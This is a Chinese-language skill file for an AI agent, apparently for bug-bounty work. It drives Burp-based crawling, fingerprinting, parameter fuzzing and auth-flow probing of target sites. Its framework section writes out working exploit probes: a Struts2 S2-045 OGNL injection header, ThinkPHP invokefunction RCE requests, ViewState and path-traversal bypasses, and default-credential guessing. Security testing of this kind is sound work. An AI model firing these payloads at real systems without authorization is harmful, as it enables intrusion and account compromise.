---
name: stealth-scanner
description: Scrapling + Burp 驱动的网站爬虫。BFS 遍历页面、收割端点、框架指纹识别、API 方法探测、参数 fuzz、表单交互、框架专项探测。写 SQLite，不验证漏洞。每 10 轮自动写入 memory 进度总结。
allowed-tools: mcp__burp__*, mcp__MiniMax__*, Bash, Read, Write, Edit, Grep, Glob, Skill
---

# stealth-scanner

仅负责信息收集 + 主动探测。结果写 SQLite，漏洞验证由 vuln-review 在独立 session 完成。

## 环境常量

| 常量 | 值 |
|------|-----|
| DBS_DIR | `E:\SRC挖掘\SRC\dbs` |
| Scrapling 脚本 | `TOOLS/scrapling_fetch.py` |
| DB 操作 | `TOOLS/db_query.py` |
| 目录爆破 | `TOOLS/brutescan.py` |
| 代理预热 | `.\TOOLS\clash-helper.ps1; Enable-ClashProxyEnv` |
| IP 轮换协议 | 参见 `ip-rotate` skill |
| Memory 路径 | `C:\Users\llc\.claude\projects\e--SRC---SRC\memory\{target_name}_progress.md` |

## DB 操作

```bash
# 通过 --target 查找目标 DB（dbs/{target}_*.db 中最新）
python3 TOOLS/db_query.py --target "{目标名}" "SELECT phase FROM scan_state WHERE id=1"

# 初始化新目标 DB（由 asset-recon 调用，stealth-scanner 不需要）
python3 TOOLS/db_query.py --target "{目标名}" --init

# SELECT 查询
python3 TOOLS/db_query.py --target "{目标名}" "SELECT url, depth FROM pages WHERE status='queued' ORDER BY depth LIMIT 3"

# INSERT/UPDATE 写操作
python3 TOOLS/db_query.py --target "{目标名}" "UPDATE scan_state SET phase='spider' WHERE id=1" --write

# 带参数的写操作
python3 TOOLS/db_query.py --target "{目标名}" "INSERT INTO pages (url, depth, status) VALUES (?, ?, 'queued')" --write --params '["https://t.com/x", 1]'

# 表结构描述
python3 TOOLS/db_query.py --target "{目标名}" -t pages

# DB 健康检查
python3 TOOLS/db_query.py --target "{目标名}" --check
```

**DB 路径优先级**: `--file` > `--target`（自动找 `dbs/{target}_*.db` 中最新）> 默认

## 前置检查

1. **Burp**: `mcp__burp__list_proxy_http_history(count=1)` — 确认代理可用
2. **Scrapling**: `python3 -c "from scrapling.fetchers import Fetcher; print('ok')"`
3. **DB**: `python3 TOOLS/db_query.py --target "{目标}" --check`

任一失败则提示对应组件不可用，终止执行。

## 容错

1. 工具调用失败 → 等 2 秒 → 重试 → 最多 3 次
2. Scrapling timeout=15s → fallback StealthyFetcher → 仍失败则跳过该 URL
3. SQLite busy_timeout=5000，写失败等 1 秒重试，最多 3 次
4. Phase 3 probe 中的 HTTP 请求均走 Burp 代理（127.0.0.1:8080）

## MiniMax 路由

路由规则和 prompt 模板统一由 `mmx-router` skill 定义。

**铁律**: Burp 历史、DB 结果集（>10 行）、JS/HTML（>5KB）— 先给 `mmx text chat` 处理，Claude 只读精简结果。

## 状态机

phases: `init` → `auth_pending` → `auth_ready` → `spider` ↔ `probe` → `brute` → `spider`

`spider`/`probe`/`brute` 循环，永不终止。

| phase | 含义 | 操作 |
|-------|------|------|
| `init` | 初始化 | 加载 DB、代理预热 |
| `auth_pending` | 等待凭证 | 提示操作员通过 Burp 手动登录 |
| `auth_ready` | 已获会话凭证 | 可发起认证请求 |
| `spider` | BFS 爬取 + 框架指纹 | 页面遍历、JS 收割、框架识别 |
| `probe` | 业务主动探测 | API 方法探测、参数 fuzz、表单交互、认证流探测、框架专项探测 |
| `brute` | 目录爆破 | brutescan.py 扫 200 条/轮 |

## Phase 1: 初始化

### 入口检查

从 `args="目标: {name}"` 解析目标名。若未提供，尝试从 `scan_state.target_id` JOIN `targets` 表推断。

```bash
python3 TOOLS/db_query.py --target "{目标}" "SELECT name FROM sqlite_master WHERE type='table' AND name='scan_state'"
```

结果:
- 表存在 → 读取 phase 和 scan_state
- 不存在 → 输出 "请先调用 asset-recon skill 初始化目标"，终止

```bash
python3 TOOLS/db_query.py --target "{目标}" "SELECT phase, seed_url, total_pages, total_js, total_suspicious, total_findings, call_count FROM scan_state WHERE id=1"
```

phase 分支:
- `spider` → Phase 2
- `probe` → Phase 3
- `brute` → Phase 4
- `auth_pending` → 登录流程
- `auth_ready` → Phase 2
- `init` 或无数据 → 继续 Phase 1.1

### 1.1 DB 初始化（首次）

```sql
PRAGMA journal_mode=WAL;
PRAGMA busy_timeout=5000;
```

```sql
INSERT INTO scan_state (target_id, seed_url, phase, started_at, max_depth, max_pages, call_count)
VALUES ((SELECT id FROM targets WHERE target_name='{目标}'), '{seed_url}', 'auth_pending', '{datetime}', 3, 200, 0);
```

### 1.2 登录流程（简化）

**不再录制 auth_flow_steps**，只读取 `auth_sessions` 中的有效凭证。

#### 1.2.1 检查已有会话

```sql
SELECT token_name, token_value, domain FROM auth_sessions WHERE is_active=1;
```

| auth_sessions | 动作 |
|--------------|------|
| 有有效会话 | 检查 cookie 是否仍然有效（请求一个已知需认证的页面返回 200） |
| 无有效会话 | 提示操作员通过 Burp 代理手动登录目标站，登录成功后手动写入 auth_sessions |

#### 1.2.2 会话验证

```bash
# 用 Burp 发送一次已知需认证的请求，检查返回状态码
# 示例: GET /api/user/profile 或类似端点
mcp__burp__send_http1_request(method="GET", url="http://目标/api/user/profile", ...）
```

- 返回 200 → session 有效，`UPDATE scan_state SET phase='auth_ready'`
- 返回 302/401 → session 无效，提示操作员重新登录

#### 1.2.3 代理预热

```powershell
. .\TOOLS\clash-helper.ps1; Enable-ClashProxyEnv
```

> IP 轮换**不自动触发**。仅当操作员明确要求时才执行 `Switch-ClashProxy`。

### 1.3 恢复检查

```
phase = 'spider':
  SELECT url, depth FROM pages WHERE status='queued' ORDER BY depth;
  pages 空 → 从头开始 | queued > 0 → Phase 2 | visited>0 且 queued=0 → 转 probe

phase = 'probe':
  SELECT count(*) FROM suspicious_points WHERE test_status='untested';
  untested > 0 → Phase 3 | 空 → 转 brute

phase = 'brute':
  SELECT count(*) as queued FROM pages WHERE status='queued';
  有 queued → UPDATE phase='spider' → Phase 2 | 空 → Phase 3
```

## Phase 2: BFS 爬虫 + 框架指纹

### 2.0 会话有效性检查

```sql
SELECT token_name, token_value FROM auth_sessions WHERE is_active=1 AND domain LIKE '%{domain}%';
```

需要但缺少 cookie → 提示操作员重新登录 via Burp，凭证写入后继续。

### BFS 主循环

每次迭代取下一个 queued URL:

```sql
SELECT url, depth FROM pages WHERE status='queued' ORDER BY depth LIMIT 1;
```

空 → 转 Phase 3 (probe)。

**Step 1 — 抓取页面**

```bash
python3 TOOLS/scrapling_fetch.py "{url}" --extract-all
```

`status < 200` 或 error 非空 → 标记 visited 跳过。

**Step 2 — 框架指纹识别**

从以下特征识别框架，结果写入 `suspicious_points` (test_type='framework_fingerprint'):

| 特征 | 可能框架 | 后续 probe 方向 |
|------|----------|----------------|
| URL 路径包含 `!methodName` | Apache Struts2 | S2-045/046/057/061 OGNL RCE probe |
| Header 含 `X-Powered-By: Struts` | Apache Struts2 | 同上 |
| 响应含 `__VIEWSTATE` | ASP.NET | ViewState 反序列化 probe |
| URL 含 `.php`/`Think`/`index.php` | ThinkPHP | ThinkPHP RCE probe |
| Header 含 `Server: openresty` | OpenResty/Nginx+Lua | 路径限制绕过 probe |
| URL 含 `/actuator`/`/api/` 且 JSON 响应 | Spring Boot | /actuator/* 信息泄露 probe |
| Header 含 `Server: Jetty` 或 `Servlet` | Java Servlet | WebSocket、反序列化 probe |
| URL 后缀 `.do` / `.action` | Struts2 / Spring MVC | OGNL / SPEL 注入 probe |

**Step 3 — 子链接入队**

从 `$.links` 筛选同域路径，depth+1 后 INSERT:

```sql
INSERT INTO pages (url, depth, status) VALUES (?, ?, 'queued') ON CONFLICT(url) DO NOTHING;
```

仅当 depth < max_depth 时入队。

**Step 4 — 分析页面**

```sql
INSERT INTO js_files (url, page_url) VALUES (?, ?) ON CONFLICT(url) DO NOTHING;
```

- 路径级端点（`/` 开头、不含 `?`）→ pages 队列
- 含参数的 API → 写入 suspicious_points (test_status='untested')
- form 结构 → 页面 JSON 字段存储，后续 Phase 3 使用

**Step 5 — 会话过期检测**

响应 302/401 或内容含登录页特征 → 提示操作员重新登录 via Burp，凭证写入后重新抓取。

**Step 6 — 可疑点判定**

| 发现来源 | 条件 | test_type |
|----------|------|-----------|
| `$.suspicious_params` | 参数名含 file/path/uid/cmd 等关键字 | 按 test_type |
| form 隐藏字段敏感值 | `role=user`, `type=admin`, `uid=1` | idor |
| HTML 中硬编码 secret | sessionId/token/key | info_disclosure |
| `$.apis` 含内部路径 | `/admin`, `/debug`, `/internal` | info_disclosure |
| 文件上传点 | `$.forms` 中 input type=file | file_upload |
| JS 中硬编码密钥 | AES/API key/secret | hardcoded_secret |
| 框架指纹 | Step 2 匹配到的框架 | framework_fingerprint |

可疑点积累在对话中，每处理 1-3 页后批量写 DB:

```sql
INSERT INTO suspicious_points (id, page_url, url, param, method, test_type, evidence, source, reasoning, risk, created_at)
VALUES ('SP-001', ...), ('SP-002', ...), ...;
```

**Step 7 — 更新页面状态**

```sql
UPDATE pages SET status='visited', title='{title}', links_found={n}, forms_json='{json}', js_files_json='{json}', api_calls_json='{json}', suspicious_params_json='{json}', crawled_at='{datetime}' WHERE url='{url}';
```

**Step 8 — 每 10 页执行**

- WAL checkpoint: `PRAGMA wal_checkpoint(TRUNCATE);`
- IP 切换：**不自动执行**，等操作员指令。

### JS 收割

```sql
SELECT url FROM js_files WHERE analyzed=0 LIMIT 1;
```

```bash
python3 TOOLS/scrapling_fetch.py "{js_url}" --html
```

JS 内容走 MiniMax 提取:

```bash
mmx text chat --message "从这个JS提取: 1.API端点 2.硬编码密钥/token 3.内部路由 4.调试开关。JSON输出。" --message "$(cat {js_file})"
```

写入:

```sql
UPDATE js_files SET analyzed=1, discovered_apis_json='{MiniMax输出}', hardcoded_secrets_json='{MiniMax输出}', internal_routes_json='{MiniMax输出}', debug_switches_json='{MiniMax输出}', analyzed_at='{datetime}' WHERE url='{url}';
```

发现的路径级端点入 pages 队列。

## Phase 3: 业务主动探测

BFS 队列空后自动进入。读取已发现的端点做主动测试。本阶段所有 HTTP 请求通过 Burp 代理发送。

### 3.0 读取框架指纹

```sql
SELECT url, evidence FROM suspicious_points WHERE test_type='framework_fingerprint' AND test_status='untested';
```

### 3.1 取待测可疑点

```sql
SELECT id, url, param, method, test_type, evidence, risk FROM suspicious_points WHERE test_status='untested' LIMIT 3;
```

空 → 转 Phase 4 (brute)。

### 3.2 API 方法探测

对每个非页面端点（含可疑参数、API 端点），试不同 HTTP 方法:

```bash
for method in POST PUT DELETE PATCH OPTIONS; do
  mcp__burp__send_http1_request(method="$method", url="http://目标/path", ...)
done
```

条件:
- 原始页面（首页/登录页）不测——只有 `/api/`、`/register/`、`!action` 等业务端点才测
- 响应 code/size 和 GET 明显不同 → 记录到 suspicious_points

```sql
INSERT INTO suspicious_points (id, page_url, url, param, method, test_type, evidence, source, reasoning, risk, test_status, created_at)
VALUES ('{id}', '{page_url}', '{url}', '{param}', '{method}', 'method_tampering', '{evidence}', 'api_method_probe', '{reasoning}', 'Medium', 'untested', datetime('now','localtime'));
```

### 3.3 参数 Fuzz

对无认证的业务端点，注入常见参数名:

```
常见参数: id, uid, user_id, type, role, page, limit, status, key, token, cmd, file, path, url, redirect, action, method, debug, test, admin
```

通过 Burp 发送 baseline 请求，记录响应大小。然后对每个参数名注入:

```bash
mcp__burp__send_http1_request(method="GET", url="http://目标/path?id=1", ...)
mcp__burp__send_http1_request(method="GET", url="http://目标/path?uid=1", ...)
# ... 其余参数
```

响应大小与基准明显不同 → 写入 suspicious_points (test_type='parameter_fuzz')。

```sql
INSERT INTO suspicious_points (id, page_url, url, param, method, test_type, evidence, source, reasoning, risk, test_status, created_at)
VALUES ('{id}', '{page_url}', '{url}', 'id=1', 'GET', 'parameter_fuzz', '{响应差异}', 'parameter_fuzz', '响应大小与基准不同', 'Medium', 'untested', datetime('now','localtime'));
```

### 3.4 表单交互

对 `forms_json` 非空的已访页面，提取无认证表单并提交:

```sql
SELECT url, forms_json FROM pages WHERE forms_json IS NOT NULL AND forms_json != '[]';
```

从 `forms_json` 提取 form action 和默认字段，通过 Burp POST 空数据/默认值:

```bash
mcp__burp__send_http1_request(method="POST", url="http://目标/form-action", data="field1=&field2=", ...)
```

响应状态/大小/内容与空请求有差异 → 记录到 suspicious_points (test_type='form_interaction')。

### 3.5 认证/注册流探测

对含 login/register 特征的端点:

| 检查项 | 方法 | 判定 |
|--------|------|------|
| 验证码可复用 | 同一 captcha token 请求 2 次 | 第二次仍 200 → 无验证码防护 |
| 用户枚举 | 用户名存在/不存在返回差异 | code/size/msg 不同 |
| 注册开放 | POST 注册页返回 200+成功 | 无需认证即可注册 |
| 密码重置 | 重置链接 token 可预测 | 枚举 token |
| 默认凭证 | admin/admin123, test/test123 等 | 登录成功 |
| 响应差异 | 登录失败原因不同（用户不存在 vs 密码错误） | 用户枚举 |

发现后写入 suspicious_points (test_type='auth_flow')。

### 3.6 框架专项探测（Phase 2 指纹触发）

根据 Phase 2 识别的框架自动触发对应 probe。所有 probe 仅发送读请求，不执行写入操作。

#### Apache Struts2

```bash
# S2-045 OGNL 注入探测
mcp__burp__send_http1_request(method="POST", url="http://目标/struts2-showcase/employee/list", headers="Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=@ognl.MemberAccess@EMPTY).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#w=#res.getWriter()).(#w.print('S2-045-TEST')).(#w.flush()).(#w.close())}", ...)
```

检测回显含 `S2-045-TEST` → Struts2 RCE 确认。

#### ThinkPHP

```bash
# ThinkPHP 5.x RCE 探测
mcp__burp__send_http1_request(method="GET", url="http://目标/?s=index/~/POST", ...)
# 预期: 路由解析错误但不 404
mcp__burp__send_http1_request(method="GET", url="http://目标/?s=index/think\Container/invokefunction", ...)
```

响应包含 PHP error 或路由结构 → 可注入。

#### Spring Boot

```bash
# /actuator/env 信息泄露
mcp__burp__send_http1_request(method="GET", url="http://目标/actuator/env", ...)

# /actuator/configprops
mcp__burp__send_http1_request(method="GET", url="http://目标/actuator/configprops", ...)

# /actuator/heapdump（不下载，只探测存在性）
mcp__burp__send_http1_request(method="GET", url="http://目标/actuator/heapdump", ...)
```

/actuator/env 返回 JSON 且包含环境变量 → 信息泄露。

#### ASP.NET

```bash
# __VIEWSTATE 反序列化探测
mcp__burp__send_http1_request(method="POST", url="http://目标/page.aspx", data="__VIEWSTATE=/wEPDwULLTE2NzQ2MTQxMDA9ZGS0F9s5Z...", ...)
```

#### OpenResty/Nginx+Lua

```bash
# 路径限制绕过探测
mcp__burp__send_http1_request(method="GET", url="http://目标/api/admin/getStatus", ...)
# 403
mcp__burp__send_http1_request(method="GET", url="http://目标/api/../../admin/getStatus", ...)
# 尝试 bypass
```

路径穿越后返回 200 → 路径限制绕过。

### 3.7 暂停条件

```sql
SELECT count(*) as untested FROM suspicious_points WHERE test_status='untested';
```

- `untested = 0` → 转 Phase 4 (brute)
- 处理完本轮 3 条 → 输出摘要退出（下次调用继续）

```sql
UPDATE scan_state SET phase='probe', total_suspicious=(SELECT count(*) FROM suspicious_points), call_count=call_count+1 WHERE id=1;
```

## Phase 4: 自动目录爆破

BFS+Probe 队列全空后自动触发。

### 4.1 代理检查

```powershell
. .\TOOLS\clash-helper.ps1; Enable-ClashProxyEnv
```

IP 切换**不自动执行**，等操作员指令后再调用 `Switch-ClashProxy`。

### 4.2 运行 brutescan

```bash
python3 TOOLS/brutescan.py -u {target_url} -n 200 -o results.json
```

### 4.3 导入结果

```sql
INSERT INTO pages (url, depth, status) VALUES (?, 1, 'queued') ON CONFLICT(url) DO NOTHING;
```

同时用 Burp 发送一次保留历史记录:

```bash
mcp__burp__send_http1_request(method="GET", url="http://目标/", ...)
```

### 4.4 转回 spider

```sql
UPDATE scan_state SET phase='spider' WHERE id=1;
```

有 queued → Phase 2。空（字典扫完）→ 回 `probe`。

## 10 轮记忆总结机制

在每次 skill 调用结束时执行，独立于 phase 处理。

### 实现逻辑

```python
# 伪代码（嵌入 skill 结束时执行）
call_count_result = db_query("SELECT call_count FROM scan_state WHERE id=1")
call_count = call_count_result['call_count']
call_count += 1
db_query("UPDATE scan_state SET call_count=? WHERE id=1", [call_count])

if call_count % 10 == 0:
    write_memory_summary(target_name, call_count, scan_state)
```

### write_memory_summary 函数

1. 读取当前 scan_state（phase, total_pages, total_js, total_suspicious, total_findings）
2. 读取 `pages WHERE status='visited'` 计数
3. 读取 `suspicious_points WHERE test_status='untested'` top 5 按 risk
4. 读取 `findings` top 3 按 risk
5. 写入 `C:\Users\llc\.claude\projects\e--SRC---SRC\memory\{target_name}_progress.md`
6. 输出: "已写入进度记忆（{call_count}/10 轮）"

### Memory 文件格式

```markdown
---
name: {target_name}-progress
description: {目标} 扫描进度记忆（自动每10轮更新）
metadata:
  type: project
  target: {target_name}
  last_updated: {datetime}
---

# {目标} 扫描进度 — {datetime}

## 当前状态
- Phase: {phase}
- 页面: {visited} visited / {total}
- JS: {n} analyzed
- 可疑点: {n} (untested: {n})
- 确认漏洞: {n}

## 关键发现
- {bullet points}

## 待处理
- {bullet points}

## 下一步
- {next steps}
```

## 调用行为

每次 Skill 调用只做有限量工作后终止:

- `spider`: 处理 1-3 页 + 1 个 JS 文件
- `probe`: 处理 1-3 条可疑点（方法探测/参数 fuzz/表单交互/框架探测）
- `brute`: 跑 200 条目录爆破 → 导入 → 切回 spider
- 无可做工作 → 输出统计摘要后干净退出

```
=== stealth-scanner 执行摘要 ===
目标: {target_name}
Phase: {phase}
页面: {n} visited
JS: {n} analyzed
可疑点: {n} (untested: {n})
确认漏洞: {n}
call_count: {call_count}
```

## 数据库 schema

### targets

```sql
CREATE TABLE targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_name TEXT NOT NULL,
    domain TEXT,
    ip TEXT,
    tech_stack TEXT,
    requires_auth INTEGER DEFAULT 0,
    auth_status TEXT DEFAULT 'not_logged_in',
    discovered_at TEXT DEFAULT (datetime('now', 'localtime')),
    notes TEXT
);
```

### scan_state

```sql
CREATE TABLE scan_state (
    id INTEGER PRIMARY KEY,
    target_id INTEGER REFERENCES targets(id),
    seed_url TEXT,
    phase TEXT DEFAULT 'init',
    started_at TEXT,
    spider_ended_at TEXT,
    reviewed_at TEXT,
    max_depth INTEGER DEFAULT 3,
    max_pages INTEGER DEFAULT 200,
    total_pages INTEGER DEFAULT 0,
    total_js INTEGER DEFAULT 0,
    total_apis INTEGER DEFAULT 0,
    total_forms INTEGER DEFAULT 0,
    total_suspicious INTEGER DEFAULT 0,
    total_findings INTEGER DEFAULT 0,
    call_count INTEGER DEFAULT 0
);
```

### pages

```sql
CREATE TABLE pages (
    id INTEGER PRIMARY KEY,
    url TEXT UNIQUE,
    depth INTEGER DEFAULT 0,
    status TEXT DEFAULT 'queued',
    title TEXT,
    links_found INTEGER DEFAULT 0,
    forms_json TEXT,
    js_files_json TEXT,
    api_calls_json TEXT,
    suspicious_params_json TEXT,
    crawled_at TEXT
);
```

队列操作:
```sql
SELECT url, depth FROM pages WHERE status='queued' ORDER BY depth LIMIT 1;  -- 取下一个
INSERT INTO pages (url, depth, status) VALUES (?, ?, 'queued');              -- 入队
UPDATE pages SET status='visited', ... WHERE url=?;                          -- 标记完成
```

### js_files

```sql
CREATE TABLE js_files (
    id INTEGER PRIMARY KEY,
    url TEXT UNIQUE,
    page_url TEXT,
    analyzed INTEGER DEFAULT 0,
    discovered_apis_json TEXT,
    hardcoded_secrets_json TEXT,
    internal_routes_json TEXT,
    debug_switches_json TEXT,
    analyzed_at TEXT
);
```

### suspicious_points

```sql
CREATE TABLE suspicious_points (
    id TEXT PRIMARY KEY,
    page_url TEXT,
    url TEXT,
    param TEXT,
    method TEXT DEFAULT 'GET',
    test_type TEXT,
    evidence TEXT,
    source TEXT,
    reasoning TEXT,
    risk TEXT DEFAULT 'Medium',
    test_status TEXT DEFAULT 'untested',
    burp_request_id INTEGER,
    created_at TEXT DEFAULT (datetime('now', 'localtime')),
    notes TEXT
);
```

### findings

```sql
CREATE TABLE findings (
    id TEXT PRIMARY KEY,
    sp_id TEXT,
    target_id INTEGER REFERENCES targets(id),
    type TEXT,
    url TEXT,
    param TEXT,
    method TEXT,
    payload TEXT,
    evidence TEXT,
    risk TEXT,
    cvss TEXT,
    remediation TEXT,
    confirmed_at TEXT,
    burp_request_id INTEGER
);
```

## 协作

- scanner 写入: `pages`, `js_files`, `suspicious_points` (test_status='untested')
- vuln-review 读取上述表, 更新: `suspicious_points.test_status`, `findings`
- WAL 模式 + busy_timeout=5000 处理并发

## 故障恢复

1. `SELECT phase FROM scan_state WHERE id=1` — 检查阶段
2. `SELECT url, depth FROM pages WHERE status='queued' ORDER BY depth` — 恢复 BFS 队列
3. `SELECT id, test_type FROM suspicious_points WHERE test_status='untested'` — 恢复 probe 队列
4. 从对应 phase 继续